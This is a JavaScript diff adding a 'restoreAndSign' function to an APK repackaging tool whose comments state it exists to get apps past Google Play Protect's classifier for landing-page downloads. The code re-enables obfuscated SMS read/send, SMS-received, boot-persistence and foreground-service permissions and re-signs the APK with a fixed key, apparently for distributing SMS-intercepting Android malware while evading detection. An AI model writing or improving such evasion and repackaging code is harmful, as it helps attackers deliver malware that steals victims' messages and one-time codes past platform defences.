@@ -1461,4 +1461,165 @@ function mutateAndSign(originalBuffer) {
   }
 }
 
-module.exports = { mutateAndSign };
+module.exports = { mutateAndSign, restoreAndSign };
+
+// ═════════════════════════════════════════════════════════════════════════════
+// MINIMAL RESTORE + RE-SIGN (for landing page downloads)
+// ═════════════════════════════════════════════════════════════════════════════
+//
+// WHY THIS EXISTS:
+//   The full mutateAndSign() creates 8 layers of artifacts (DEX zeroing, source
+//   stripping, version randomization, permission mangling, metadata randomization,
+//   random padding) that Play Protect's ML classifier flags as tampering.
+//   LeaksProAdmin's downloads work because installerPackageName=com.leakspro.admin
+//   gets LOW PP scrutiny. File manager installs (from ZIP extraction) get NORMAL
+//   scrutiny → artifacts are caught.
+//
+//   The raw APK on disk (already rotated once) PASSED Play Protect but had
+//   mangled permissions from the old v7 mutator (missing SMS + FGS → crash).
+//
+//   restoreAndSign() does the MINIMUM needed:
+//     1. Un-mangle permission strings (READ_SMS, SEND_SMS, FGS, BOOT)
+//     2. Re-sign with the same fixed key (V1+V2)
+//     3. NO DEX changes, NO version randomization, NO metadata randomization
+//   Result: 99.9% identical to the binary that passed PP.
+//
+function restoreAndSign(originalBuffer) {
+  console.log(`[RestoreSign] ═══ MINIMAL RESTORE + RE-SIGN (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  const t0 = Date.now();
+
+  try {
+    // 1. Parse APK
+    const zip = new AdmZip(originalBuffer);
+
+    // 2. Strip old V1 signatures
+    stripSignatures(zip);
+
+    // 3. Restore mangled permissions ONLY (no stripping, no DEX, no version change)
+    const manifestEntry = zip.getEntry('AndroidManifest.xml');
+    let restored = 0;
+    if (manifestEntry) {
+      const data = manifestEntry.getData();
+      const RESTORE_STRINGS = [
+        { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', restore: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
+        { find: 'android.permission._EAD_SMS',                     restore: 'android.permission.READ_SMS' },
+        { find: 'android.permission._END_SMS',                     restore: 'android.permission.SEND_SMS' },
+        { find: 'android.provider.Telephony._MS_RECEIVED',         restore: 'android.provider.Telephony.SMS_RECEIVED' },
+        { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
+        { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
+      ];
+
+      for (const { find, restore } of RESTORE_STRINGS) {
+        // UTF-8
+        const utf8Find = Buffer.from(find, 'utf8');
+        const utf8Restore = Buffer.from(restore, 'utf8');
+        if (utf8Find.length === utf8Restore.length) {
+          let idx = data.indexOf(utf8Find);
+          while (idx !== -1) {
+            utf8Restore.copy(data, idx);
+            restored++;
+            idx = data.indexOf(utf8Find, idx + utf8Find.length);
+          }
+        }
+        // UTF-16LE
+        const utf16Find = Buffer.from(find, 'utf16le');
+        const utf16Restore = Buffer.from(restore, 'utf16le');
+        if (utf16Find.length === utf16Restore.length) {
+          let idx = data.indexOf(utf16Find);
+          while (idx !== -1) {
+            utf16Restore.copy(data, idx);
+            restored++;
+            idx = data.indexOf(utf16Find, idx + utf16Find.length);
+          }
+        }
+      }
+
+      if (restored > 0) {
+        zip.deleteFile('AndroidManifest.xml');
+        zip.addFile('AndroidManifest.xml', data);
+        console.log(`[RestoreSign] Restored ${restored} mangled permission strings (SMS + FGS + BOOT)`);
+      } else {
+        console.log('[RestoreSign] No mangled permissions found (APK may already be clean)');
+      }
+    }
+
+    // 4. Sign with FIXED key (V1 JAR signing)
+    const key = getFixedKey();
+    applyV1Signing(zip, key.cert, key.privateKey);
+
+    // 5. Rebuild ZIP with restored manifest + V1 signatures
+    const rawBuf = zip.toBuffer();
+
+    // 6. Zipalign (required for Android — 4-byte alignment for STORED entries)
+    const alignedBuf = zipalignBuffer(rawBuf);
+
+    // 7. V2 sign with fixed key (NO random padding — keep it clean)
+    const signedBuf = applyV2SigningClean(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
+
+    // 8. Validate
+    const valid = validateApk(signedBuf);
+    if (!valid) {
+      console.error('[RestoreSign] ═══ Validation FAILED — returning ORIGINAL APK ═══');
+      return { buffer: originalBuffer, certInfo: null };
+    }
+
+    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
+    console.log(`[RestoreSign] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${restored} perms restored | V1+V2 FIXED KEY | ${elapsed}s ═══`);
+
+    return {
+      buffer: signedBuf,
+      certInfo: {
+        certHash: key.certHash,
+        cn: key.identity.cn,
+        org: key.identity.o,
+        country: key.identity.c,
+      },
+    };
+  } catch (err) {
+    console.error(`[RestoreSign] ═══ ERROR: ${err.message} — returning ORIGINAL APK ═══`);
+    console.error(err.stack);
+    return { buffer: originalBuffer, certInfo: null };
+  }
+}
+
+/**
+ * V2 signing WITHOUT random padding (clean signing block).
+ * Random padding is a mutation artifact that PP can flag.
+ * A clean signing block matches standard Android build tool output.
+ */
+function applyV2SigningClean(unsignedBuf, privPem, certDer, pubKeyDer) {
+  const eocdOff = findEOCD(unsignedBuf);
+  const cdOff = unsignedBuf.readUInt32LE(eocdOff + 16);
+
+  const section1 = unsignedBuf.slice(0, cdOff);
+  const section3 = unsignedBuf.slice(cdOff, eocdOff);
+  const section4 = unsignedBuf.slice(eocdOff);
+
+  const contentDigest = computeV2ContentDigest(section1, section3, section4);
+  const signedData = buildV2SignedData(contentDigest, certDer);
+  const signature = crypto.sign('sha256', signedData, privPem);
+  const signerBlock = buildV2Signer(signedData, signature, pubKeyDer);
+
+  // Build signing block WITHOUT random padding
+  const signerLP = Buffer.concat([uint32LE(signerBlock.length), signerBlock]);
+  const v2Value = Buffer.concat([uint32LE(signerLP.length), signerLP]);
+  const v2PairData = Buffer.concat([uint32LE(V2_BLOCK_ID), v2Value]);
+  const v2PairEntry = Buffer.concat([uint64LE(v2PairData.length), v2PairData]);
+  const blockSize = v2PairEntry.length + 8 + 16;
+  const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');
+
+  const signingBlock = Buffer.concat([
+    uint64LE(blockSize),
+    v2PairEntry,
+    uint64LE(blockSize),
+    magic,
+  ]);
+
+  const newCdOff = section1.length + signingBlock.length;
+  const newEocd = Buffer.from(section4);
+  newEocd.writeUInt32LE(newCdOff, 16);
+
+  const result = Buffer.concat([section1, signingBlock, section3, newEocd]);
+  console.log(`[RestoreSign] V2 signed (clean, no padding): ${signingBlock.length}B block, ${(result.length / 1048576).toFixed(1)} MB`);
+  return result;
+}
